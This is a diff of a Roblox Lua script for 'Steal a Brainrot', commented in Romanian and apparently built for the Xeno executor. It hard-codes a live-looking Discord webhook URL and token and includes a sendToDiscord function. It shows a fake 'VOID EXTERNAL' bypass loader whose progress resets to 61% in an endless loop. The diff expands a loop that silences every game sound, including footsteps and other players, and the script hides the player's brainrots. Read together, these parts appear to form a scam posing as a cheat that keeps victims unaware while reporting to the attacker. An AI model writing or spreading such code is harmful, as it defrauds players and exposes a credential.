@@ -1,6 +1,6 @@
 -- Script pentru Xeno - Steal a Brainrot (VOID EXTERNAL + Discord)
+-- BLOCARE TOTALĂ A SUNETELOR (INCLUSIV PAȘI, CLONE, BĂTĂI)
 -- Compatibil cu Xeno Executor
--- INTERFAȚA EXACT CA ÎN POZĂ (MOV + NEGRU)
 
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
@@ -9,6 +9,7 @@ local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
 local Workspace = game:GetService("Workspace")
 local CoreGui = game:GetService("CoreGui")
 local SoundService = game:GetService("SoundService")
+local RunService = game:GetService("RunService")
 
 -- ===== CONFIGURARE =====
 local WEBHOOK = "https://discord.com/api/webhooks/1510999167244304554/kScJIW0h-ZUy0Aadhs936Y-8ZEAiTKnyewPvwbg6y7SrHHOwA5l4MotrcmGMBzzCy9gF"
@@ -28,10 +29,17 @@ local function sendToDiscord(message)
     end
 end
 
--- ===== BLOCARE TOTALĂ A SUNETELOR (XENO) =====
+-- ===== BLOCARE TOTALĂ A SUNETELOR (INCLUSIV PAȘI ȘI CLONE) =====
 local function muteAllSounds()
+    print("🔇 Blochez TOATE sunetele...")
+    
+    -- 1. Oprește volumul global
     pcall(function()
         SoundService.Volume = 0
+    end)
+    
+    -- 2. Oprește toate sunetele existente
+    pcall(function()
         for _, sound in pairs(game:GetDescendants()) do
             if sound:IsA("Sound") then
                 sound.Volume = 0
@@ -41,22 +49,56 @@ local function muteAllSounds()
         end
     end)
     
-    spawn(function()
-        while true do
-            task.wait(0.1)
-            pcall(function()
-                SoundService.Volume = 0
-                for _, sound in pairs(game:GetDescendants()) do
-                    if sound:IsA("Sound") and (sound.Volume > 0 or sound.Playing == true) then
+    -- 3. Oprește sunetele din toți jucătorii (inclusiv clone)
+    pcall(function()
+        for _, player in pairs(Players:GetPlayers()) do
+            if player.Character then
+                for _, sound in pairs(player.Character:GetDescendants()) do
+                    if sound:IsA("Sound") then
                         sound.Volume = 0
                         sound:Stop()
                         sound.Playing = false
                     end
                 end
+            end
+        end
+    end)
+    
+    -- 4. BLOCEAZĂ ORICE SUNET NOU (loop la fiecare 0.05 secunde)
+    spawn(function()
+        while true do
+            task.wait(0.05)
+            pcall(function()
+                SoundService.Volume = 0
+                for _, sound in pairs(game:GetDescendants()) do
+                    if sound:IsA("Sound") then
+                        if sound.Volume > 0 or sound.Playing == true then
+                            sound.Volume = 0
+                            sound:Stop()
+                            sound.Playing = false
+                        end
+                    end
+                end
             end)
         end
     end)
-    print("✅ Toate sunetele blocate!")
+    
+    -- 5. Ascunde și oprește sunetele de pași și clone din Workspace
+    pcall(function()
+        for _, obj in pairs(Workspace:GetDescendants()) do
+            if obj:IsA("Model") or obj:IsA("Part") then
+                for _, sound in pairs(obj:GetDescendants()) do
+                    if sound:IsA("Sound") then
+                        sound.Volume = 0
+                        sound:Stop()
+                        sound.Playing = false
+                    end
+                end
+            end
+        end
+    end)
+    
+    print("✅ TOATE sunetele au fost blocate!")
 end
 
 -- ===== ASCUNDE BRAINROT-URILE =====
@@ -137,14 +179,12 @@ local function showLoader()
     screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
     screenGui.IgnoreGuiInset = true
 
-    -- Fundal negru
     local background = Instance.new("Frame")
     background.Size = UDim2.new(1, 0, 1, 0)
     background.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
     background.BorderSizePixel = 0
     background.Parent = screenGui
 
-    -- Titlu "VOID EXTERNAL"
     local title = Instance.new("TextLabel")
     title.Size = UDim2.new(0.6, 0, 0, 60)
     title.Position = UDim2.new(0.2, 0, 0.12, 0)
@@ -156,7 +196,6 @@ local function showLoader()
     title.TextXAlignment = Enum.TextXAlignment.Left
     title.Parent = screenGui
 
-    -- Procent
     local percent = Instance.new("TextLabel")
     percent.Size = UDim2.new(0.3, 0, 0, 60)
     percent.Position = UDim2.new(0.7, 0, 0.12, 0)
@@ -168,7 +207,6 @@ local function showLoader()
     percent.TextXAlignment = Enum.TextXAlignment.Right
     percent.Parent = screenGui
 
-    -- Linia de progres
     local progressBg = Instance.new("Frame")
     progressBg.Size = UDim2.new(0.9, 0, 0, 4)
     progressBg.Position = UDim2.new(0.05, 0, 0.25, 0)
@@ -182,7 +220,6 @@ local function showLoader()
     progressBar.BorderSizePixel = 0
     progressBar.Parent = progressBg
 
-    -- BYPASSI
     local bypassText = Instance.new("TextLabel")
     bypassText.Size = UDim2.new(0.9, 0, 0, 30)
     bypassText.Position = UDim2.new(0.05, 0, 0.30, 0)
@@ -296,7 +333,6 @@ local function showLoader()
     combatSys.TextXAlignment = Enum.TextXAlignment.Right
     combatSys.Parent = screenGui
 
-    -- Linie separator
     local line = Instance.new("Frame")
     line.Size = UDim2.new(0.9, 0, 0, 1)
     line.Position = UDim2.new(0.05, 0, 0.68, 0)
@@ -338,7 +374,7 @@ local function showLoader()
     log3.TextXAlignment = Enum.TextXAlignment.Left
     log3.Parent = screenGui
 
-    -- Procent 61% (static, ca în poză)
+    -- Procent 61% (static)
     local percentBottom = Instance.new("TextLabel")
     percentBottom.Size = UDim2.new(0.9, 0, 0, 25)
     percentBottom.Position = UDim2.new(0.05, 0, 0.89, 0)
@@ -355,8 +391,6 @@ local function showLoader()
     -- ===== ANIMAȚIE LOADER =====
     spawn(function()
         local progress = 0
-        
-        -- 0% → 90% (rapid)
         while progress < 90 do
             progress = progress + math.random(2, 5)
             if progress > 90 then progress = 90 end
@@ -379,7 +413,6 @@ local function showLoader()
             task.wait(0.03)
         end
         
-        -- 90% → 100% (foarte greu)
         while progress < 100 do
             progress = progress + 0.05
             if progress > 100 then progress = 100 end
@@ -400,7 +433,6 @@ local function showLoader()
             task.wait(0.15)
         end
         
-        -- Reset la 61% și buclă
         while true do
             task.wait(2)
             progress = 61
